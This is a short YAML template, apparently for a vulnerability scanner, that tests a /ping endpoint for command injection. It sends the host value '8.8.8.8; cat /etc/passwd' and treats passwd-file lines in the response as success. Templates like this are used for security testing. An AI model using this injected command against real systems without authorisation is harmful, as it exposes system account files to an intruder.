name: 命令注入测试
description: 测试命令注入漏洞
level: 高
author: Test
request:
  method: POST
  path: /ping
  params:
    host: "8.8.8.8; cat /etc/passwd"
    count: "1"
  headers:
    Content-Type: "application/x-www-form-urlencoded"
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    X-Requested-With: "XMLHttpRequest"
  body: "host=8.8.8.8%3B%20cat%20%2Fetc%2Fpasswd&count=1"
response:
  matchType: contains
  successIndicators:
    - "root:x:0:0:"
    - "daemon:x:1:1:"
    - "bin:x:2:2:"
  errorIndicators:
    - "ping: unknown host"
    - "invalid host"
    - "command not found"
  statusCode: 200